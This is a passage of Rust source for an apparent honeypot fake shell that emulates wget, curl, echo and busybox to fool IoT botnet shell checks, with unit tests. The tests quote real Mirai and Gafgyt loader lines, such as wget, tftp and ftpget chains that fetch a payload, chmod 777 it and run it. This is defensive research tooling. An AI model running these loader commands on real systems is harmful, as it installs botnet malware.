        mut want_s,
        mut want_n,
        mut want_r,
        mut want_v,
        mut want_m,
        mut want_p,
        mut want_i,
        mut want_o,
    ) = (false, false, false, false, false, false, false, false);
    let mut all = false;
    let mut any_flag = false;
    for arg in &parts[1..] {
        if let Some(long) = arg.strip_prefix("--") {
            any_flag = true;
            match long {
                "all" => all = true,
                "kernel-name" => want_s = true,
                "nodename" => want_n = true,
                "kernel-release" => want_r = true,
                "kernel-version" => want_v = true,
                "machine" => want_m = true,
                "processor" => want_p = true,
                "hardware-platform" => want_i = true,
                "operating-system" => want_o = true,
                _ => {}
            }
        } else if let Some(shorts) = arg.strip_prefix('-') {
            any_flag = true;
            for c in shorts.chars() {
                match c {
                    'a' => all = true,
                    's' => want_s = true,
                    'n' => want_n = true,
                    'r' => want_r = true,
                    'v' => want_v = true,
                    'm' => want_m = true,
                    'p' => want_p = true,
                    'i' => want_i = true,
                    'o' => want_o = true,
                    _ => {}
                }
            }
        }
    }
    // `-a` reuses the canonical line (same persona source), keeping its exact historical bytes; a
    // bare `uname` is the kernel name, like real coreutils.
    if all {
        return format!("{}\n", persona::uname_all(&host));
    }
    if !any_flag {
        return "Linux\n".to_string();
    }
    let mut fields = Vec::new();
    if want_s {
        fields.push("Linux".to_string());
    }
    if want_n {
        fields.push(host.clone());
    }
    if want_r {
        fields.push(persona::KERNEL_RELEASE.to_string());
    }
    if want_v {
        fields.push(persona::KERNEL_BUILD.to_string());
    }
    if want_m {
        fields.push(persona::ARCH.to_string());
    }
    if want_p {
        fields.push(persona::ARCH.to_string());
    }
    if want_i {
        fields.push(persona::ARCH.to_string());
    }
    if want_o {
        fields.push("GNU/Linux".to_string());
    }
    if fields.is_empty() {
        // Only unrecognized flags: degrade to the kernel name rather than erroring, since a wrong
        // error format would itself be a tell.
        return "Linux\n".to_string();
    }
    format!("{}\n", fields.join(" "))
}

/// A plausible fetched body, printed by `curl URL` and `wget -O- URL` (the `... | sh` pattern).
/// Canned by necessity - the module performs zero network I/O - but real servers do answer a bare
/// path with exactly this Apache-default page, so it is not itself a tell; the previous tell was
/// only that `-O`/`-o` (save to a file) also printed it, which a real client never does.
const FETCHED_BODY: &str =
    "<html><head><title>Welcome</title></head><body><h1>It works!</h1></body></html>\n";

/// `wget URL`: the classic wget banner (connection line, HTTP status, progress bar, final "saved"
/// summary) - zero network I/O, see the module doc. The timestamp is real wall-clock time (a frozen
/// date is a tell an attacker catches by running twice). The saved filename is derived from `-O` or
/// the URL's own basename rather than a constant "index.html" (every download claiming the same
/// name was a tell); `-q`/`-nv` suppress the banner as real wget does; `-O-`/`-qO-` write the body
/// to stdout (the `wget -qO- | sh` loader pattern) instead of the transcript.
fn cmd_wget(parts: &[&str]) -> String {
    let url = fetch_url_arg("wget", &parts[1..]).unwrap_or("");
    let sanitized_url = sanitize_value(url, MAX_URL_LEN);

    let out = wget_output(parts);
    if out == WgetOutput::Stdout {
        return FETCHED_BODY.to_string();
    }
    if parts
        .iter()
        .any(|&p| p == "-q" || p == "-nv" || p == "--quiet")
    {
        return String::new();
    }
    let name = match out {
        WgetOutput::File(n) => n,
        _ => wget_basename(url),
    };
    let name = sanitize_value(&name, MAX_URL_LEN);
    let now = chrono::Utc::now().format("%Y-%m-%d %H:%M:%S");
    format!(
        "--{now}--  {sanitized_url}\n\
         Connecting to {sanitized_url}... connected.\n\
         HTTP request sent, awaiting response... 200 OK\n\
         Length: 1234 (1.2K) [application/octet-stream]\n\
         Saving to: '{name}'\n\
         \n\
         {name}          100%[==================>]   1.2K  --.-KB/s    in 0s\n\
         \n\
         {now} (1.2 MB/s) - '{name}' saved [1234/1234]\n"
    )
}

#[derive(PartialEq)]
enum WgetOutput {
    Stdout,
    File(String),
    Default,
}

/// Resolve wget's output target from its flags: `-O-`/`-qO-` -> stdout, `-O <name>` -> that file,
/// otherwise the default (URL basename).
fn wget_output(parts: &[&str]) -> WgetOutput {
    for (i, &p) in parts.iter().enumerate() {
        if p == "-O-" || p == "-qO-" || p == "-nvO-" {
            return WgetOutput::Stdout;
        }
        if p == "-O" {
            match parts.get(i + 1) {
                Some(&"-") => return WgetOutput::Stdout,
                Some(name) => return WgetOutput::File(strip_one_quote_pair(name).to_string()),
                None => return WgetOutput::Default,
            }
        }
        if let Some(name) = p.strip_prefix("-O") {
            // `-Ofile` (no space).
            if name == "-" {
                return WgetOutput::Stdout;
            }
            return WgetOutput::File(name.to_string());
        }
    }
    WgetOutput::Default
}

/// The basename a real wget would save a URL to: the last path segment (query string stripped), or
/// `index.html` when the URL ends in `/` or has no path.
fn wget_basename(url: &str) -> String {
    let path = url.split(['?', '#']).next().unwrap_or(url);
    match path.trim_end_matches('/').rsplit('/').next() {
        Some(seg) if !seg.is_empty() && !seg.contains(':') => seg.to_string(),
        _ => "index.html".to_string(),
    }
}

/// `curl URL`. With `-O`/`-o` (save to a file) a real curl writes nothing to stdout - only a
/// progress meter to stderr, which this shell does not emit - so the output is empty; the previous
/// implementation printed the fetched body even under `-O`, which no real curl does and which was a
/// clean one-probe tell. Without `-o`/`-O`, the body goes to stdout as curl does.
fn cmd_curl(parts: &[&str]) -> String {
    let saves_to_file = parts.iter().enumerate().any(|(i, &p)| {
        p == "-O"
            || p == "--remote-name"
            || p == "-o"
            || p == "--output"
            || (p.starts_with("-o") && p.len() > 2)
            // a combined short-flag cluster containing O or o, e.g. -sO, -fsSLO
            || (p.starts_with('-') && !p.starts_with("--") && p[1..].chars().any(|c| c == 'O')
                && parts.get(i).is_some())
    });
    if saves_to_file {
        String::new()
    } else {
        FETCHED_BODY.to_string()
    }
}

/// `ping HOST`. Real ping exists on virtually every host, so "command not found" is a tell. A
/// line-based fake shell cannot stream a continuous ping, so this answers as though `-c` bounded it:
/// a couple of replies and a summary against the requested target, printed at once.
fn cmd_ping(parts: &[&str]) -> String {
    let target = first_non_flag_arg(&parts[1..]).unwrap_or("localhost");
    let target = sanitize_value(target, MAX_URL_LEN);
    // A stable pseudo-address for the target so two pings of the same host agree (a real resolve
    // would); derived from the name, not random.
    let last = 1 + (target.bytes().fold(0u32, |a, b| a.wrapping_add(b as u32)) % 253);
    format!(
        "PING {target} ({}): 56 data bytes\n\
         64 bytes from {}: icmp_seq=0 ttl=54 time=11.4 ms\n\
         64 bytes from {}: icmp_seq=1 ttl=54 time=11.9 ms\n\
         \n\
         --- {target} ping statistics ---\n\
         2 packets transmitted, 2 packets received, 0.0% packet loss\n\
         round-trip min/avg/max/stddev = 11.4/11.7/11.9/0.3 ms\n",
        format_args!("93.184.216.{last}"),
        format_args!("93.184.216.{last}"),
        format_args!("93.184.216.{last}"),
    )
}

/// The first token that does not look like a flag (does not start with `-`), or `None` if every
/// token is a flag or the slice is empty. `ls -la`, `ls -la /tmp`, and `cat -A file` all name
/// their real target after zero or more flags this fake shell has no reason to parse
/// individually; treating the first `-`-prefixed token as the path (what a bare
/// `parts.get(1)` lookup would do) misreads the single most common attacker recon command
/// (`ls -la`) as a lookup for a nonexistent path named `-la`.
fn first_non_flag_arg<'a>(args: &[&'a str]) -> Option<&'a str> {
    args.iter().find(|arg| !arg.starts_with('-')).copied()
}

/// A honeypot `echo` faithful enough to survive the shell-detection handshakes IoT botnets run
/// before they drop a payload. The important one is Gafgyt/BASHLITE, which sends
/// `echo -e "\x47\x41\x59\x46\x47\x54"` and hangs up unless it reads back exactly `GAYFGT`. The
/// previous implementation joined the raw tokens (flags, surrounding quotes, and undecoded escapes
/// included), so that probe returned `-e "\x47\x41\x59\x46\x47\x54"` and fingerprinted the honeypot
/// on the spot. This interprets a leading run of `-e`/`-n`/`-E` flags, removes one pair of matching
/// surrounding quotes per token (the whitespace tokenizer keeps them), and under `-e` decodes the
/// backslash escapes a real `echo -e` would. It only transforms text - nothing here is evaluated or
/// executed, per the module's never-exec guarantee.
fn cmd_echo(args: &[&str]) -> String {
    let mut interpret = false; // -e
    let mut trailing_newline = true; // -n suppresses
    let mut first_operand = 0;
    for (idx, tok) in args.iter().enumerate() {
        // A flag token is '-' followed only by e/n/E (e.g. -e, -n, -E, -en). Anything else, or a
        // bare '-', ends the option run and begins the operands.
        let is_flag = tok.len() >= 2
            && tok.starts_with('-')
            && tok[1..].chars().all(|c| matches!(c, 'e' | 'n' | 'E'));
        if !is_flag {
            first_operand = idx;
            break;
        }
        for c in tok[1..].chars() {
            match c {
                'e' => interpret = true,
                'E' => interpret = false,
                'n' => trailing_newline = false,
                _ => {}
            }
        }
        first_operand = idx + 1;
    }

    let mut out = String::new();
    for (idx, tok) in args[first_operand..].iter().enumerate() {
        if idx > 0 {
            out.push(' ');
        }
        let unquoted = strip_one_quote_pair(tok);
        if interpret {
            if decode_echo_escapes_into(unquoted, &mut out) {
                // A `\c` escape stops all further output, including the trailing newline.
                return out;
            }
        } else {
            out.push_str(unquoted);
        }
    }
    if trailing_newline {
        out.push('\n');
    }
    out
}

/// Remove one pair of matching surrounding quotes (`"..."` or `'...'`) from a token, if present.
/// The fake shell tokenizes on whitespace, so a quoted argument with no internal spaces arrives as
/// a single token still wearing its quotes; a real shell would have stripped them before `echo`.
fn strip_one_quote_pair(tok: &str) -> &str {
    let bytes = tok.as_bytes();
    if bytes.len() >= 2
        && (bytes[0] == b'"' || bytes[0] == b'\'')
        && bytes[bytes.len() - 1] == bytes[0]
    {
        &tok[1..tok.len() - 1]
    } else {
        tok
    }
}

/// Decode the backslash escapes `echo -e` understands, appending to `out`. Returns `true` if a
/// `\c` escape was hit, which tells the caller to stop producing output entirely. Supports the
/// escapes real-world loaders actually use: `\xHH` hex, `\0NNN`/`\NNN` octal, and the single-letter
/// set (`\n \t \r \\ \a \b \f \v \0`).
fn decode_echo_escapes_into(s: &str, out: &mut String) -> bool {
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c != '\\' {
            out.push(c);
            continue;
        }
        match chars.next() {
            Some('n') => out.push('\n'),
            Some('t') => out.push('\t'),
            Some('r') => out.push('\r'),
            Some('a') => out.push('\x07'),
            Some('b') => out.push('\x08'),
            Some('f') => out.push('\x0c'),
            Some('v') => out.push('\x0b'),
            Some('\\') => out.push('\\'),
            Some('c') => return true, // stop all further output
            Some('x') => {
                // Up to two hex digits.
                let mut val: u32 = 0;
                let mut n = 0;
                while n < 2 {
                    match chars.peek().and_then(|d| d.to_digit(16)) {
                        Some(d) => {
                            val = val * 16 + d;
                            chars.next();
                            n += 1;
                        }
                        None => break,
                    }
                }
                if n == 0 {
                    out.push_str("\\x"); // not a valid escape: emit literally
                } else if let Some(ch) = char::from_u32(val) {
                    out.push(ch);
                }
            }
            Some('0') => {
                // \0NNN: up to three octal digits after the 0.
                let mut val: u32 = 0;
                let mut n = 0;
                while n < 3 {
                    match chars.peek().and_then(|d| d.to_digit(8)) {
                        Some(d) => {
                            val = val * 8 + d;
                            chars.next();
                            n += 1;
                        }
                        None => break,
                    }
                }
                if let Some(ch) = char::from_u32(val) {
                    out.push(ch);
                }
            }
            Some(other) => {
                // Unknown escape: bash echo -e emits it verbatim (backslash included).
                out.push('\\');
                out.push(other);
            }
            None => out.push('\\'), // trailing backslash
        }
    }
    false
}

#[cfg(test)]
mod echo_tests {
    use super::cmd_echo;

    #[test]
    fn gafgyt_handshake_returns_gayfgt() {
        // The exact probe Gafgyt/BASHLITE sends, tokenized as the fake shell would split it:
        // `echo` `-e` `"\x47\x41\x59\x46\x47\x54"`. It must read back "GAYFGT" or the bot hangs up.
        let out = cmd_echo(&["-e", "\"\\x47\\x41\\x59\\x46\\x47\\x54\""]);
        assert_eq!(out, "GAYFGT\n");
    }

    #[test]
    fn plain_echo_strips_surrounding_quotes() {
        assert_eq!(cmd_echo(&["\"hello\""]), "hello\n");
        assert_eq!(cmd_echo(&["'world'"]), "world\n");
    }

    #[test]
    fn without_dash_e_escapes_stay_literal() {
        // Default (no -e) and explicit -E both leave backslash escapes untouched.
        assert_eq!(cmd_echo(&["\\x47"]), "\\x47\n");
        assert_eq!(cmd_echo(&["-E", "\"\\x47\""]), "\\x47\n");
    }

    #[test]
    fn dash_n_suppresses_the_trailing_newline() {
        assert_eq!(cmd_echo(&["-n", "hi"]), "hi");
        assert_eq!(cmd_echo(&["-en", "\"\\x41\""]), "A");
    }

    #[test]
    fn decodes_hex_and_octal_escapes_under_dash_e() {
        assert_eq!(cmd_echo(&["-e", "\\x41\\x42"]), "AB\n"); // hex
        assert_eq!(cmd_echo(&["-e", "\\0101"]), "A\n"); // octal 101 = 'A'
        assert_eq!(cmd_echo(&["-e", "a\\tb"]), "a\tb\n"); // tab
    }

    #[test]
    fn dash_c_stops_output_including_newline() {
        assert_eq!(cmd_echo(&["-e", "ab\\cd"]), "ab");
    }

    #[test]
    fn multiple_operands_join_with_single_spaces() {
        assert_eq!(cmd_echo(&["a", "b", "c"]), "a b c\n");
    }

    #[test]
    fn bare_echo_prints_only_a_newline() {
        assert_eq!(cmd_echo(&[]), "\n");
    }
}

#[cfg(test)]
mod shell_detection_tests {
    use super::{
        BUSYBOX_APPLETS, EmitContext, FakeShell, SIGNAL_HONEYPOT_FILE_DOWNLOAD, busybox_banner,
        cmd_curl, cmd_uname, cmd_wget, download_target, is_busybox_applet, simple_commands,
        url_if_fetch_line,
    };
    use crate::fakefs::FakeFs;

    fn shell() -> FakeShell {
        FakeShell::new(
            FakeFs::new(),
            EmitContext {
                source_ip: "203.0.113.7".parse().unwrap(),
                wan_ip: None,
                authenticated: true,
                protocol_label: "telnet".to_string(),
                session_id: None,
            },
        )
    }

    fn xor(s: &str, key: u8) -> String {
        String::from_utf8(crate::command_codec::xor_bytes(s, key)).unwrap()
    }

    #[test]
    fn xor_obfuscated_command_is_decoded_dispatched_and_annotated() {
        let mut sh = shell();
        // The first obfuscated anchor ("enable" ^ 0x09) locks the session key.
        sh.handle_input(&xor("enable", 0x09));
        // The obfuscated busybox probe now decodes and reaches the grammar.
        let probe_obf = xor("/bin/busybox LZRD", 0x09);
        let (out, events) = sh.handle_input(&probe_obf);
        assert!(
            out.contains("LZRD: applet not found"),
            "decoded probe must get the busybox applet reply, got {out:?}"
        );
        assert_eq!(events[0].metadata["command"], probe_obf); // raw bytes preserved verbatim
        assert_eq!(events[0].metadata["command_decoded"], "/bin/busybox LZRD");
        assert_eq!(events[0].metadata["xor_key"], 9);
    }

    #[test]
    fn plaintext_command_has_no_decoded_annotation() {
        let (_out, events) = shell().handle_input("uname -a");
        assert_eq!(events[0].metadata["command"], "uname -a");
        assert!(events[0].metadata.get("command_decoded").is_none());
        assert!(events[0].metadata.get("xor_key").is_none());
    }

    #[test]
    fn binary_flood_emits_one_marker_event_not_one_per_line() {
        // A channel streaming binary (an SSH IP produced >20k such "command" events) must not add
        // one ledger event per garbage line.
        let mut sh = shell();
        let garbage = "\u{FFFD}".repeat(40);

        let (_out, first) = sh.handle_input(&garbage);
        assert_eq!(
            first.len(),
            1,
            "the first binary line emits a single marker"
        );
        assert_eq!(first[0].metadata["flood"], "binary");

        let mut more = 0;
        for _ in 0..100 {
            more += sh.handle_input(&garbage).1.len();
        }
        assert_eq!(more, 0, "subsequent binary lines emit no further events");
    }

    #[test]
    fn command_flood_is_capped_to_one_marker_past_the_per_session_limit() {
        let cap = super::MAX_COMMANDS_PER_SESSION;
        let mut sh = shell();
        let mut total = 0;
        for i in 0..(cap + 50) {
            total += sh.handle_input(&format!("cmd{i}")).1.len();
        }
        // `cap` real command events + exactly one cap marker; never one per line.
        assert_eq!(total, cap as usize + 1);
    }

    #[test]
    fn a_normal_fetch_command_still_emits_its_command_and_download_events() {
        let (_out, events) = shell().handle_input("wget http://198.51.100.9/x");
        assert_eq!(
            events.len(),
            2,
            "a fetch emits the command event + the download event"
        );
        assert!(events.iter().any(|e| e.metadata.get("url").is_some()));
    }

    #[test]
    fn encode_output_mirrors_after_a_command_locks_the_key() {
        let mut sh = shell();
        sh.handle_input(&xor("enable", 0x09)); // an obfuscated command locks 0x09
        assert_eq!(sh.encode_output(b"# "), xor("# ", 0x09).into_bytes());
        // A plaintext session leaves output unchanged.
        let mut plain = shell();
        plain.handle_input("uname");
        assert_eq!(plain.encode_output(b"# "), b"# ".to_vec());
    }

    #[test]
    fn bin_busybox_path_form_gets_the_applet_reply() {
        // The full-path probe the LZRD variant sends must resolve like a bare `busybox` invocation.
        let (out, _) = shell().handle_input("/bin/busybox LZRD");
        assert!(out.contains("LZRD: applet not found"), "got {out:?}");
    }

    #[test]
    fn cat_proc_self_cmdline_returns_the_reading_process_argv() {
        // Every real Linux has /proc/self/cmdline; a "No such file or directory" is a honeypot tell
        // some Mirai/Gafgyt loaders check before delivering a payload. /proc/self is the `cat`
        // process, so it returns cat's own argv, NUL-separated with a trailing NUL and no newline.
        let (out, _) = shell().handle_input("cat /proc/self/cmdline");
        assert_eq!(out, "cat\0/proc/self/cmdline\0");
    }

    #[test]
    fn cd_proc_then_cat_relative_cmdline_resolves_against_cwd() {
        // The observed bot ran `cd /proc && cat self/cmdline`; the relative path must resolve.
        let mut sh = shell();
        sh.handle_input("cd /proc");
        let (out, _) = sh.handle_input("cat self/cmdline");
        assert_eq!(out, "cat\0self/cmdline\0");
    }

    #[test]
    fn cat_relative_file_resolves_against_cwd() {
        let mut sh = shell();
        sh.handle_input("cd /etc");
        let (out, _) = sh.handle_input("cat hostname");
        assert!(out.contains("server01"), "got: {out:?}");
    }

    #[test]
    fn sh_is_never_command_not_found() {
        // Every real system has /bin/sh; "command not found" would out the honeypot instantly.
        let (out, events) = shell().handle_input("sh");
        assert_eq!(out, "");
        assert_eq!(events.len(), 1); // command_exec only, no spurious download
    }

    /// Observed live 2026-09-06: a Mirai scanner sent `ls /home; /bin/busybox BOTNET` as ONE line.
    /// The shell dispatched the whole line as `ls` with `/home;` as its argument, answered
    /// "cannot access '/home;'", and the busybox probe never ran - so the loader never saw the
    /// "applet not found" reply it gates its download stage on, and left. A real shell runs each
    /// command in turn.
    #[test]
    fn semicolon_separated_commands_each_run_and_the_busybox_gate_still_answers() {
        let (out, events) = shell().handle_input("ls /home; /bin/busybox BOTNET");
        assert!(
            out.contains("ubuntu"),
            "ls /home must list the home dir: {out:?}"
        );
        assert!(
            out.ends_with("BOTNET: applet not found\n"),
            "the busybox probe after the `;` must run and answer: {out:?}"
        );
        assert!(!out.contains("cannot access"), "{out:?}");
        assert_eq!(
            events.len(),
            1,
            "still one command_exec event per input line"
        );
    }

    #[test]
    fn cd_then_pwd_on_one_line_sees_the_new_directory() {
        let (out, _) = shell().handle_input("cd /tmp; pwd");
        assert_eq!(out, "/tmp\n");
    }

    #[test]
    fn and_and_or_short_circuit_on_the_previous_outcome() {
        let (out, _) = shell().handle_input("nosuchcmd && echo ran");
        assert!(
            !out.contains("ran"),
            "&& after a failure must not run: {out:?}"
        );
        let (out, _) = shell().handle_input("nosuchcmd || echo fallback");
        assert!(
            out.ends_with("fallback\n"),
            "|| after a failure must run: {out:?}"
        );
        let (out, _) = shell().handle_input("id && echo ok");
        assert!(out.contains("uid=0") && out.ends_with("ok\n"), "{out:?}");
    }

    #[test]
    fn a_pipeline_stays_one_command_answered_by_its_first_stage() {
        // `|` is not a control operator here: the left stage answers, as before this change.
        let (out, _) = shell().handle_input("id | grep uid");
        assert!(out.contains("uid=0(root)"), "{out:?}");
        assert!(!out.contains("grep"), "{out:?}");
    }

    /// Observed live 2026-09-06, verbatim: a loader probing for a writable directory before
    /// choosing a drop location, then printing the marker it keys its next stage on.
    #[test]
    fn writable_directory_probe_chain_reaches_the_busybox_marker() {
        let mut sh = shell();
        let (out, events) = sh.handle_input(
            ">/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;\
             >/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;\
             /bin/busybox echo -e '\\x51\\x4a\\x4c\\x58\\x54\\x4b'",
        );
        assert_eq!(
            out, "QJLXTK\n",
            "every probe silent, then exactly the marker"
        );
        assert_eq!(sh.cwd, "/var", "the last successful `&& cd` wins");
        assert_eq!(events.len(), 1, "one command_exec for the line");
        assert_eq!(
            events[0].signal_type,
            sensor_wire::SIGNAL_HONEYPOT_COMMAND_EXEC,
            "no download event: the line retrieves nothing"
        );
    }

    #[test]
    fn a_redirection_probe_into_a_missing_directory_fails_and_blocks_its_cd() {
        let mut sh = shell();
        let (out, _) = sh.handle_input(">/nonexistent/.x&&cd /nonexistent;pwd");
        assert_eq!(
            out, "bash: /nonexistent/.x: No such file or directory\n/root\n",
            "{out:?}"
        );
        assert_eq!(sh.cwd, "/root");
    }

    #[test]
    fn a_created_file_shows_up_in_a_later_listing() {
        let mut sh = shell();
        sh.handle_input("cd /tmp; >.x");
        let (out, _) = sh.handle_input("ls -a /tmp");
        assert!(out.contains(".x"), "{out:?}");
    }

    #[test]
    fn cd_into_a_directory_the_box_does_not_present_is_refused() {
        let mut sh = shell();
        let (out, _) = sh.handle_input("cd /nonexistent");
        assert_eq!(out, "bash: cd: /nonexistent: No such file or directory\n");
        assert_eq!(sh.cwd, "/root");
        // Directories the root listing advertises, and ancestors of modeled files, still work.
        assert_eq!(sh.handle_input("cd /proc").0, "");
        assert_eq!(sh.handle_input("cd /bin").0, "");
    }

    #[test]
    fn su_on_a_root_shell_is_silent() {
        assert_eq!(shell().handle_input("su").0, "");
        assert_eq!(shell().handle_input("su -").0, "");
        assert_eq!(shell().handle_input("su root").0, "");
    }

    #[test]
    fn background_ampersand_and_newline_also_separate_commands() {
        let (out, _) = shell().handle_input("cd /etc & pwd\nwhoami");
        assert!(out.ends_with("/etc\nroot\n"), "{out:?}");
    }

    #[test]
    fn mirai_busybox_probe_returns_applet_not_found() {
        // `/bin/busybox <TOKEN>` is Mirai/Gafgyt's real-shell check; they require the exact
        // "<TOKEN>: applet not found" reply before delivering a payload.
        let (out, _) = shell().handle_input("busybox MIRAI");
        assert_eq!(out, "MIRAI: applet not found\n");
    }

    #[test]
    fn busybox_echo_still_passes_the_gafgyt_handshake() {
        let (out, _) = shell().handle_input("busybox echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"");
        assert_eq!(out, "GAYFGT\n");
    }

    #[test]
    fn sh_dash_c_runs_the_inner_command() {
        let (out, _) = shell().handle_input("sh -c \"id\"");
        assert!(out.contains("uid=0(root)"), "got: {out}");
    }

    #[test]
    fn busybox_wget_is_captured_as_a_download() {
        let (_, events) = shell().handle_input("busybox wget http://198.51.100.9/bins/x86");
        let dl = events
            .iter()
            .find(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
            .expect("busybox wget must emit a file_download event");
        assert_eq!(dl.metadata["url"], "http://198.51.100.9/bins/x86");
    }

    #[test]
    fn download_target_recognizes_direct_and_busybox_forms() {
        assert_eq!(
            download_target(&["wget", "http://x/y"]).as_deref(),
            Some("http://x/y")
        );
        // Previously asserted `Some("x")` - the FILENAME - which was the defect: a scheme-less
        // fragment the fetcher cannot parse. The host and file are separate tokens; the url is
        // synthesized from both.
        assert_eq!(
            download_target(&["busybox", "tftp", "-g", "-r", "x", "10.0.0.1"]).as_deref(),
            Some("tftp://10.0.0.1/x")
        );
        assert_eq!(download_target(&["busybox", "MIRAI"]), None);
        assert_eq!(download_target(&["ls", "-la"]), None);
    }

    #[test]
    fn download_target_captures_full_path_fetch_forms() {
        // Loaders routinely invoke fetchers by absolute path; `download_target` must resolve the
        // basename like `dispatch` does, or the `honeypot_file_download` evidence is silently lost
        // for these while the shell still answers them in-persona. Scheme-less tftp is the case the
        // `url_if_fetch_line` URL-scheme fallback cannot rescue.
        assert_eq!(
            download_target(&[
                "/bin/busybox",
                "tftp",
                "-g",
                "-r",
                "payload.arm",
                "198.51.100.9"
            ])
            .as_deref(),
            Some("tftp://198.51.100.9/payload.arm")
        );
        assert_eq!(
            download_target(&["/usr/bin/wget", "http://198.51.100.9/x"]).as_deref(),
            Some("http://198.51.100.9/x")
        );
        // The busybox APPLET token is matched raw, like cmd_busybox: `busybox /bin/tftp` is
        // "applet not found" to the persona, so it must not be recorded as a fetch.
        assert_eq!(
            download_target(&["busybox", "/bin/tftp", "-g", "-r", "x", "10.0.0.1"]),
            None
        );
    }

    // The exact retrieval lines a live Mirai loader ran against the telnet sensor (documentation
    // address in place of the real payload host). Both had been recorded as the bare host with no
    // scheme, so the fetcher never queued either.
    #[test]
    fn download_target_synthesizes_urls_for_bare_tftp_and_ftpget() {
        // `-g HOST -r FILE`: host before the -r operand.
        assert_eq!(
            download_target(&["tftp", "-g", "198.51.100.9", "-r", "tftp"]).as_deref(),
            Some("tftp://198.51.100.9/tftp")
        );
        // `ftpget HOST LOCAL REMOTE`: the remote name is the last positional.
        assert_eq!(
            download_target(&["ftpget", "198.51.100.9", "f", "ftpget"]).as_deref(),
            Some("ftp://198.51.100.9/ftpget")
        );
        // `ftpget HOST REMOTE` (local name defaulted).
        assert_eq!(
            download_target(&["ftpget", "198.51.100.9", "bin.arm"]).as_deref(),
            Some("ftp://198.51.100.9/bin.arm")
        );
        // Explicit ports, both syntaxes.
        assert_eq!(
            download_target(&["tftp", "-g", "-r", "x", "198.51.100.9", "6969"]).as_deref(),
            Some("tftp://198.51.100.9:6969/x")
        );
        assert_eq!(
            download_target(&["ftpget", "-P", "2121", "198.51.100.9", "x"]).as_deref(),
            Some("ftp://198.51.100.9:2121/x")
        );
        // `-l` alone names the remote file too (BusyBox behaviour); `-u`/`-p` operands are skipped,
        // never mistaken for the host.
        assert_eq!(
            download_target(&["tftp", "-g", "-l", "local.bin", "198.51.100.9"]).as_deref(),
            Some("tftp://198.51.100.9/local.bin")
        );
        assert_eq!(
            download_target(&["ftpget", "-u", "anon", "-p", "x", "198.51.100.9", "f"]).as_deref(),
            Some("ftp://198.51.100.9/f")
        );
        // A host with no file is still evidence; no host at all is not a fetch.
        assert_eq!(
            download_target(&["tftp", "-g", "198.51.100.9"]).as_deref(),
            Some("tftp://198.51.100.9")
        );
        assert_eq!(download_target(&["tftp", "-g", "-r", "x"]), None);
    }

    /// A loader line seen live 2026-09-03 (host replaced): the output file is named BEFORE the
    /// url, and the whole thing is a `cd` chain with the fetchers in a subshell. It was recorded
    /// as a download of `1.sh`, a bare filename the fetcher could not retrieve.
    #[test]
    fn output_file_named_before_the_url_is_not_mistaken_for_the_url() {
        let line = "cd /tmp||cd /var/run||cd /mnt||cd /root||cd /;(wget -q -O 1.sh http://198.51.100.9:80/1.sh||busybox wget -q -O 1.sh http://198.51.100.9:80/1.sh||curl -so 1.sh http://198.51.100.9:80/1.sh)&&chmod 777 1.sh&&sh 1.sh;echo ok";
        let (_out, events) = shell().handle_input(line);
        let urls: Vec<_> = events
            .iter()
            .filter(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
            .map(|e| e.metadata["url"].as_str().unwrap().to_string())
            .collect();
        assert_eq!(urls, vec!["http://198.51.100.9:80/1.sh"]);

        // Schemeless forms still resolve by position, with option values skipped either way.
        assert_eq!(
            download_target(&["wget", "-q", "-O", "1.sh", "198.51.100.9/1.sh"]).as_deref(),
            Some("198.51.100.9/1.sh")
        );
        assert_eq!(
            download_target(&["wget", "-qO", "1.sh", "198.51.100.9/1.sh"]).as_deref(),
            Some("198.51.100.9/1.sh"),
            "a cluster ending in a value-taking letter consumes the next token"
        );
        assert_eq!(
            download_target(&["wget", "-qO-", "198.51.100.9/1.sh"]).as_deref(),
            Some("198.51.100.9/1.sh"),
            "an attached value (`-qO-`) must not consume the url"
        );
        assert_eq!(
            download_target(&["curl", "-so", "1.sh", "198.51.100.9/1.sh"]).as_deref(),
            Some("198.51.100.9/1.sh")
        );
        assert_eq!(
            download_target(&["curl", "--output", "1.sh", "198.51.100.9/1.sh"]).as_deref(),
            Some("198.51.100.9/1.sh")
        );
    }

    /// The three retrieval lines a live Mirai loader sent (2026-09-02), verbatim except the host.
    /// Each fetcher is wrapped in a `( a || busybox a ) > f; ...` fallback chain, so the fetch verb
    /// is never the line's first token. The wget line was captured on the box; tftp and ftpget
    /// were not, because their URLs have no scheme for the raw-line scan to find.
    #[test]
    fn mirai_fallback_chains_emit_a_download_event_for_every_fetcher() {
        let cases = [
            (
                "(wget http://198.51.100.9/wget -O- || busybox wget http://198.51.100.9/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
                "http://198.51.100.9/wget",
            ),
            (
                "(tftp -g 198.51.100.9 -r tftp -l- || busybox tftp -g 198.51.100.9 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
                "tftp://198.51.100.9/tftp",
            ),
            (
                "(ftpget 198.51.100.9 f ftpget || busybox ftpget 198.51.100.9 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
                "ftp://198.51.100.9/ftpget",
            ),
        ];
        for (line, url) in cases {
            let (_out, events) = shell().handle_input(line);
            let dls: Vec<_> = events
                .iter()
                .filter(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
                .collect();
            assert_eq!(dls.len(), 1, "exactly one download event for: {line}");
            assert_eq!(dls[0].metadata["url"], url, "line: {line}");
        }
    }

    #[test]
    fn simple_commands_split_at_separators_and_stop_at_redirections() {
        assert_eq!(
            simple_commands(
                "(tftp -g h -r x -l- || busybox tftp -g h) > t; chmod 777 t && ./t 2>&1"
            ),
            vec![
                vec!["tftp", "-g", "h", "-r", "x", "-l-"],
                vec!["busybox", "tftp", "-g", "h"],
                vec!["chmod", "777", "t"],
                vec!["./t"],
            ]
        );
        // A `&` inside a query string is part of the URL, not a background operator.
        assert_eq!(
            simple_commands("wget http://h/x?a=1&b=2 -O- & sleep 1"),
            vec![
                vec!["wget", "http://h/x?a=1&b=2", "-O-"],
                vec!["sleep", "1"]
            ]
        );
    }

    #[test]
